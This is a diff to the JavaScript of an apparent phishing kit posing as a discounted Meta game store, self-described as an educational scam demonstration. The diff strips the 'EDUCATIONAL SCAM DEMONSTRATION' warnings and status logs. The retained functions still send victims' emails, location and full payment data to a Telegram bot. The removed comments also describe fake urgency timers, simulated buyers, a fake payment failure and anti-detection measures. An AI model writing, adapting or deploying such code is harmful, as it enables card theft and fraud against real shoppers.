@@ -733,15 +733,6 @@ window.addEventListener('load', () => {
     setTimeout(monitorPerformance, 1000);
 });
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 2 LOADED: Initialization & Basic UI');
-console.log('🚀 Initialized: Navigation, mobile menu, search functionality');
-console.log('⏰ Initialized: Countdown timers and buy button');
-console.log('🎨 Initialized: Animations and scroll effects');
-console.log('📈 Initialized: Urgency updates and customer activity simulation');
-console.log('✅ PART 2 COMPLETE - Ready for Part 3: Geolocation & Countries System');
 
 // ====================================================================
 // SCRIPT.JS - PART 3: GEOLOCATION & COUNTRIES SYSTEM
@@ -1132,18 +1123,10 @@ async function sendEmailToTelegram(email, gameName, price) {
 📧 EMAIL DATA:
 ✉️ Email: ${email}
 🎮 Game: ${gameName}
-💰 Price: $${price}
-📅 Timestamp: ${new Date().toISOString()}
+
 
 ${locationInfo}
 
-⚠️ User completed Step 1 - Email collection phase
-🔍 Next: Will proceed to payment form if they continue
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ EDUCATIONAL SCAM DEMONSTRATION ⚠️
-This shows how much data scammers collect instantly
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
     
     const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
@@ -1175,11 +1158,8 @@ async function sendFullPaymentToTelegram(paymentData) {
     const message = `
 🎯 STEP 2: COMPLETE PAYMENT DATA COLLECTED (Educational Demo)
 
-🎮 PURCHASE DETAILS:
+
 🕹️ Game: ${paymentData.gameName}
-💰 Price: $${paymentData.price}
-💰 Original: $${paymentData.originalPrice}
-💳 Total Paid: $${paymentData.price}
 
 📧 EMAIL DATA (Step 1):
 ✉️ Email: ${paymentData.email}
@@ -1194,16 +1174,8 @@ async function sendFullPaymentToTelegram(paymentData) {
 
 ${locationInfo}
 
-⏰ Session Start: ${paymentData.timestamp}
-⏰ Payment Complete: ${new Date().toISOString()}
-
 ✅ 2-STEP PROCESS COMPLETED SUCCESSFULLY!
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ EDUCATIONAL SCAM DEMONSTRATION ⚠️
-Complete victim profile created with:
-• Personal details • Financial data • Location data
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
     
     const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
@@ -1229,15 +1201,7 @@ Complete victim profile created with:
     }
 }
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 3 LOADED: Geolocation & Countries System');
-console.log('🌍 Loaded: IP geolocation fetching with comprehensive tracking');
-console.log('🌎 Loaded: World countries loading with API fallback');
-console.log('🎯 Loaded: Auto-country selection based on location');
-console.log('📊 Loaded: Telegram integration for data collection demo');
-console.log('✅ PART 3 COMPLETE - Ready for Part 4: Zip Code Validation System');
+
 
 // ====================================================================
 // SCRIPT.JS - PART 4: ZIP CODE VALIDATION SYSTEM
@@ -1665,16 +1629,7 @@ setTimeout(() => {
     }
 }, 3000);
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 4 LOADED: Zip Code Validation System');
-console.log('📮 Loaded: Country-specific zip code validation for 50+ countries');
-console.log('🎨 Loaded: Real-time zip code formatting and auto-correction');
-console.log('✅ Loaded: Form validation helpers and error management');
-console.log('💳 Loaded: Credit card validation (Luhn algorithm, BIN ranges)');
-console.log('🧪 Loaded: Testing functions for validation and formatting');
-console.log('✅ PART 4 COMPLETE - Ready for Part 5: Email Modal (Step 1)');
+
 
 // ====================================================================
 // SCRIPT.JS - PART 5: EMAIL MODAL (STEP 1)
@@ -2163,17 +2118,7 @@ setTimeout(() => {
     initializeEmailCountdown();
 }, 1000);
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 5 LOADED: Email Modal (Step 1)');
-console.log('📧 Loaded: Email modal creation and display system');
-console.log('✅ Loaded: Email form validation with real-time feedback');
-console.log('🎨 Loaded: Email processing animation and UX enhancements');
-console.log('⏰ Loaded: Email countdown timer for urgency');
-console.log('📊 Loaded: Email step analytics and tracking');
-console.log('🔔 Loaded: Notification system for user feedback');
-console.log('✅ PART 5 COMPLETE - Ready for Part 6: Payment Modal (Step 2)');
+
 
 // ====================================================================
 // SCRIPT.JS - PART 6: PAYMENT MODAL (STEP 2)
@@ -2692,16 +2637,7 @@ function closePaymentModal() {
     }
 }
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 6 LOADED: Payment Modal (Step 2)');
-console.log('💳 Loaded: Payment modal creation and display system');
-console.log('📋 Loaded: Comprehensive payment form with validation');
-console.log('🌍 Loaded: Country selection with auto-detection');
-console.log('📮 Loaded: Country-specific zip code validation');
-console.log('💳 Loaded: Credit card validation and formatting');
-console.log('✅ PART 6 COMPLETE - Ready for Part 7: Payment Processing & Results');
+
 
 // ====================================================================
 // SCRIPT.JS - PART 7: PAYMENT PROCESSING & RESULTS
@@ -3306,16 +3242,7 @@ function showSupportModal() {
     console.log('📞 Support modal displayed');
 }
 
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 7 LOADED: Payment Processing & Results');
-console.log('⏳ Loaded: Realistic payment processing with 4-phase delays (8 seconds total)');
-console.log('❌ Loaded: Professional payment failure modal with random error messages');
-console.log('🔄 Loaded: Payment retry functionality with form reset');
-console.log('📞 Loaded: Customer support modal and contact options');
-console.log('🎨 Loaded: Professional failure styling and animations');
-console.log('✅ PART 7 COMPLETE - Ready for Part 8: Utility Functions & Helpers');
+
 // ====================================================================
 // SCRIPT.JS - PART 8: UTILITY FUNCTIONS & HELPERS
 // Educational Scam Demonstration - Fake Meta Store
@@ -3828,16 +3755,3 @@ if (window.location.hostname === 'localhost' || window.location.hostname === '12
     console.log('🛠️ Development mode: window.debugScamDemo available');
     console.log('🧪 Try: debugScamDemo.showEmailModal() or debugScamDemo.testZipValidation()');
 }
-
-// ====================================================================
-// CONSOLE STATUS MESSAGE
-// ====================================================================
-console.log('🎯 SCRIPT.JS PART 8 LOADED: Utility Functions & Helpers');
-console.log('🔔 Loaded: Enhanced notification system with animations');
-console.log('📋 Loaded: Clipboard utilities and gift code generation');
-console.log('📊 Loaded: Performance monitoring and user behavior tracking');
-console.log('🖥️ Loaded: Device/browser detection and environment analysis');
-console.log('🔒 Loaded: Anti-detection measures and automation detection');
-console.log('📈 Loaded: Session tracking and engagement analytics');
-console.log('🛠️ Loaded: Development utilities and debug functions');
-console.log('✅ ALL 8 PARTS COMPLETE: Enhanced script system fully loaded!');
